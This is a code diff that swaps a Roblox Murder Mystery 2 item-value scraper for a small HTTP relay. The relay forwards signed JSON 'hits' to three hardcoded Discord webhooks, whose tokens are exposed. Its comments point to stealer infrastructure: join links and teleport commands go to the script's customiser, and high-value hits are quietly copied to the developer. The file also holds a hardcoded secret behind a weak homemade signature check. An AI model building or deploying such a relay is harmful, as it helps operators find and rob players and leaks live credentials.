@@ -1,172 +1,101 @@
-import concurrent.futures
-import os
-import re
+import json
+import time
+from http.server import BaseHTTPRequestHandler
 
-from bs4 import BeautifulSoup
-from curl_cffi import requests
-from flask import Flask, Response
+import requests
 
-app = Flask(__name__)
+SECRET = "mrxver0gg00000"
 
-BASE_DIR = os.path.dirname(os.path.abspath(__file__))
-BUNDLED_BACKUP = os.path.join(BASE_DIR, "backup.txt")
-RUNTIME_BACKUP = "/tmp/backup.txt"
-
-CAT_ORDER = [
-    "Chroma",
-    "Unique",
-    "Ancient",
-    "Godly",
-    "Vintage",
-    "Legendary",
-    "Rare",
-    "Uncommon",
-    "Common",
-]
-CAT_MAP = {
-    "common": "Common",
-    "uncommon": "Uncommon",
-    "rare": "Rare",
-    "legendary": "Legendary",
-    "godly": "Godly",
-    "ancient": "Ancient",
-    "unique": "Unique",
-    "classic": "Vintage",
-    "chroma": "Chroma",
-}
-CATEGORIES = {
-    "common": "https://supremevalues.com/mm2/commons",
-    "uncommon": "https://supremevalues.com/mm2/uncommons",
-    "rare": "https://supremevalues.com/mm2/rares",
-    "legendary": "https://supremevalues.com/mm2/legendaries",
-    "godly": "https://supremevalues.com/mm2/godlies",
-    "ancient": "https://supremevalues.com/mm2/ancients",
-    "unique": "https://supremevalues.com/mm2/uniques",
-    "classic": "https://supremevalues.com/mm2/vintages",
-    "chroma": "https://supremevalues.com/mm2/chromas",
-}
-
-HEADERS = {
-    "Accept": "text/html,application/xhtml+xml",
-    "Accept-Language": "en-US,en;q=0.9",
+WEBHOOKS = {
+  # "/" - user who modified/customized the script (join links, full hit info)
+  "user": "https://discord.com/api/webhooks/1543372730798178366/tUGF2_nM_Eg4MQsSWLVXiDuUi3fU5I35KrZlWOyXzTOJPbh3WRi3TW6xT2oYi4g054wH",
+  # "/private" - script developer (high-value hits only from client)
+  "developer": "https://discord.com/api/webhooks/1491300863598399488/isw7P25hvO2y53-vECbcJNXBC_P7EboWYF1C30_Jvaqf26uHCtMT5q56pA9mWKjG_juh",
+  # "/public" - public notifications only (no join links / teleport commands)
+  "public": "https://discord.com/api/webhooks/1523746645336920224/79VROWlAB4i8h3xIzaKF8EJcOxv8lBLL8SHWWlM7hrQfmnADKGWF8jFNmyQE5GICGijJ",
 }
 
 
-def read_backup():
-    for path in (RUNTIME_BACKUP, BUNDLED_BACKUP):
-        if os.path.exists(path):
-            with open(path, "r", encoding="utf-8") as f:
-                return f.read()
-    return None
+def simple_hash(s):
+    hash_val = 0
+    for b in s.encode("utf-8"):
+        hash_val = (hash_val * 31 + b) & 0xFFFFFFFF
+    return hash_val
 
 
-def write_backup(content):
-    try:
-        with open(RUNTIME_BACKUP, "w", encoding="utf-8") as f:
-            f.write(content)
-    except OSError as e:
-        app.logger.warning(f"Could not write runtime backup: {e}")
+def resolve_endpoint(path, headers):
+    candidates = [path or ""]
+
+    for header_name in (
+        "x-forwarded-uri",
+        "x-vercel-original-path",
+        "x-invoke-path",
+        "x-matched-path",
+    ):
+        value = headers.get(header_name)
+        if value:
+            candidates.append(value)
+
+    combined = " ".join(candidates).lower()
+
+    if "/private" in combined or "/dh" in combined:
+        return WEBHOOKS["developer"], "developer"
+    if "/public" in combined:
+        return WEBHOOKS["public"], "public"
+    return WEBHOOKS["user"], "user"
 
 
-def parse_special_value(text):
-    text = text.strip()
-    match = re.search(r"(?:X|x)?\s?([\d\.]+)", text)
-    if not match:
-        return None
-    val = float(match.group(1))
-    if "T1 Legendaries" in text:
-        return val * 0.2
-    if "T1 Rares" in text:
-        return val * 0.1
-    if "T1 Uncommons" in text:
-        return val * 0.05
-    if "T1 Common" in text:
-        return val * 0.025
-    return val
+class handler(BaseHTTPRequestHandler):
+    def _send_json(self, status_code, data):
+        self.send_response(status_code)
+        self.send_header("Content-Type", "application/json")
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode("utf-8"))
 
+    def _get_route(self):
+        return resolve_endpoint(self.path, self.headers)
 
-def fetch_category(rarity_key, url):
-    items = {}
-    try:
-        res = requests.get(url, headers=HEADERS, impersonate="chrome131", timeout=20)
-        if res.status_code != 200:
-            return rarity_key, None
-        soup = BeautifulSoup(res.text, "html.parser")
-        heads = soup.find_all(class_="itemhead")
-        bodies = soup.find_all(class_="itembody")
-        for head, body in zip(heads, bodies):
-            name = head.get_text(separator=" ").split(" Click ")[0].strip()
-            if not name:
-                continue
-            if rarity_key == "chroma":
-                name = re.sub(r"^(Chroma|C\.)\s+", "", name, flags=re.IGNORECASE)
-            val_tag = body.find("b", class_="itemvalue")
-            if val_tag:
-                raw_text = val_tag.get_text().strip()
-                if rarity_key in ["common", "uncommon", "rare", "legendary"]:
-                    final_val = parse_special_value(raw_text)
-                else:
-                    num_str = "".join(c for c in raw_text if c.isdigit() or c == ".")
-                    final_val = float(num_str) if num_str else None
-                if final_val is not None:
-                    items[name] = (
-                        int(final_val)
-                        if float(final_val).is_integer()
-                        else round(final_val, 4)
-                    )
-    except Exception:
-        return rarity_key, None
-    return rarity_key, items
+    def do_GET(self):
+        _, endpoint_name = self._get_route()
+        self._send_json(200, {"status": "alive", "endpoint": endpoint_name})
 
+    def do_POST(self):
+        webhook_url, endpoint_name = self._get_route()
+        content_length = int(self.headers.get("Content-Length", 0))
+        body = self.rfile.read(content_length).decode("utf-8")
+        timestamp = self.headers.get("X-Timestamp")
+        received_signature = self.headers.get("X-Signature")
 
-def build_lua(results):
-    lua = "return {\n"
-    for cat in CAT_ORDER:
-        items = results.get(cat) or {}
-        lua += f"    {cat} = {{\n"
-        sorted_items = sorted(items.items(), key=lambda x: (-x[1], x[0]))
-        rows = [
-            f'        ["{n.replace(chr(34), chr(92) + chr(34))}"] = {v}'
-            for n, v in sorted_items
-        ]
-        lua += ",\n".join(rows) + "\n    },\n"
-    lua = lua.rstrip(",\n") + "\n}"
-    return lua
+        if not all([body, timestamp, received_signature]):
+            return self._send_json(400, {"error": "Missing data"})
 
+        try:
+            client_time = int(timestamp)
+            server_time = int(time.time())
+            time_diff = abs(server_time - client_time)
 
-@app.route("/")
-def get_lua_table():
-    results = {}
-    failed_categories = []
+            if time_diff > 15:
+                return self._send_json(403, {"error": "Request expired", "diff": time_diff})
+        except (ValueError, TypeError):
+            return self._send_json(400, {"error": "Invalid timestamp format"})
 
-    with concurrent.futures.ThreadPoolExecutor(max_workers=9) as executor:
-        futures = {executor.submit(fetch_category, k, v): k for k, v in CATEGORIES.items()}
-        for future in concurrent.futures.as_completed(futures):
-            key, data = future.result()
-            if data is None:
-                failed_categories.append(key)
-            results[CAT_MAP[key]] = data if data is not None else {}
+        message = body + str(timestamp)
+        expected_signature = f"{simple_hash(SECRET + message):08x}"
 
-    if len(failed_categories) >= len(CATEGORIES):
-        backup = read_backup()
-        if backup:
-            return Response(backup, mimetype="text/plain")
+        if received_signature != expected_signature:
+            return self._send_json(403, {"error": "Invalid signature"})
 
-    lua_output = build_lua(results)
+        try:
+            parsed_body = json.loads(body)
+        except json.JSONDecodeError:
+            return self._send_json(400, {"error": "Invalid JSON body"})
 
-    if not failed_categories:
-        write_backup(lua_output)
-
-    return Response(lua_output, mimetype="text/plain")
-
-
-@app.route("/backup")
-def get_only_backup():
-    backup = read_backup()
-    if backup:
-        return Response(
-            backup,
-            mimetype="text/plain",
-            headers={"Content-Disposition": "inline"},
+        requests.post(
+            url=webhook_url,
+            json=parsed_body,
+            headers={"Content-Type": "application/json"},
         )
-    return "return 'nub'", 404
+        return self._send_json(
+            200,
+            {"status": "ok", "message": "Success", "endpoint": endpoint_name},
+        )
